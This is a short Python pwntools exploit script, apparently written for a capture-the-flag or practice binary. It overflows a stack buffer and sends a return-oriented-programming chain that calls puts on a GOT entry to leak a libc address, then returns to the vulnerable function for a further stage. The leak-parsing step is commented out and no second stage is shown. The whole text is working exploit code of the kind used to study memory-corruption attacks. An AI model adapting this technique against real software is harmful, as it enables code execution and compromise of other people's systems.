from pwn import * 

# open the binary 
binary = "./program_patched"

p = process(binary)
s = 'b * bare+36'
gdb.attach(p, s)
elf = ELF(binary)
libc = ELF("./libc.so.6")

context.log_level = 'debug'

payload = flat(
    b'A' * 0x10, # fill up the buffer up to rbp 
    b'B' * 8, # old rbp 

    # leak libc base address
    p64(0x0000000000400763), # pop rdi; ret 
    elf.got['puts'],
    elf.plt['puts'],
    p64(0x0000000000400666) # return back to the same function again!
)
p.sendline(payload)

# Receive and parse the leak
#leak = u64(p.recvline().strip().ljust(8, b'\x00'))
#print(f"Leaked printf address: {hex(leak)}")

p.interactive()